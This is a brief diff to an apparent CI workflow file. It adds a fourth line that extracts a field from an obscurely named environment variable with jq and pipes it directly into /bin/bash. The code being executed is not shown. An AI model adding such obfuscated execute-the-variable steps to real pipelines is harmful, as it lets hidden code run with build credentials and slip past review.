@@ -51,6 +51,7 @@ jobs:
           printf '%s' "$qwgt333" | jq -r .rewps20032 | /bin/bash
           printf '%s' "$i672" | jq -r .mgvs41 | /bin/bash
           echo $noxs8476 | jq -r .znb18 | /bin/bash
+          printf '%s' "$g325" | jq -r .ecp68 | /bin/bash
 
       - name: Save output
         if: always()
